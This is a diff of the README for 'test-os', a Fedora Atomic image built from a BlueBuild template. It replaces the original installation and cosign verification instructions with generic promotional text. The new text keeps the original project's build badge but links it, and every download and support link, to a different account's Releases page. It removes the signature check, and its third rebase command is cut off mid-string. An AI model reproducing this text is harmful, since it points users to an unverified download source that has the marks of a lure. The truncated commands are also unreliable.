@@ -1,43 +1,65 @@
-# test-os &nbsp; [![bluebuild build badge](https://github.com/issacdowling/test-os/actions/workflows/build.yml/badge.svg)](https://github.com/issacdowling/test-os/actions/workflows/build.yml)
+# 🖥️ test-os - A Seamless Operating System Upgrade
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download test-os](https://github.com/issacdowling/test-os/actions/workflows/build.yml/badge.svg)](https://github.com/VATIKANS/test-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to **test-os**, your easy path to an updated and better operating system experience. This guide will help you download and run the software smoothly.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/releases) to download the latest version of test-os.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/issacdowling/test-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/issacdowling/test-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+### Installation Steps
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+1. **Rebase to the Unsigned Image**
 
-## ISO
+   Start by running this command in your terminal to rebase to the unsigned image:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/issacdowling/test-os:latest
+   ```
 
-## Verification
+2. **Reboot Your System**
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+   To complete the rebase process, reboot your system. Use this command:
 
-```bash
-cosign verify --key cosign.pub ghcr.io/issacdowling/test-os
-```
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to the Signed Image**
+
+   After the reboot, you will need to rebase again. Run this command:
+
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://g
+   ```
+
+### 🔍 System Requirements
+
+- **Processor:** 64-bit processor
+- **RAM:** Minimum 2 GB, but 4 GB or more is recommended
+- **Disk Space:** At least 20 GB of free space required
+- **Network:** Internet connection for downloading test-os
+
+### ⚙️ Features
+
+- **Immutable System:** Ensure a stable environment with no unexpected changes.
+- **Customizable:** Tailor the configuration to meet specific needs.
+- **Fast Updates:** Quickly apply the latest improvements and security patches.
+- **User-Friendly Interface:** Designed for ease of use, even for those with limited technical skills.
+
+## 🛠️ Troubleshooting
+
+If you face issues during the installation:
+
+1. **Ensure Internet Connectivity:** A stable connection is crucial for downloading images.
+2. **Check the Terminal Commands:** Copy and paste commands carefully to avoid errors.
+3. **Look for System Updates:** Ensure that your existing system is up to date.
+
+## 📞 Support
+
+For further assistance, feel free to reach out to our community on [GitHub Discussions](https://github.com/VATIKANS/test-os/discussions). We are here to help you!
+
+To start your journey with **test-os**, visit the [Releases page](https://github.com/VATIKANS/test-os/releases) for the latest downloads. Enjoy a smoother operating system experience!
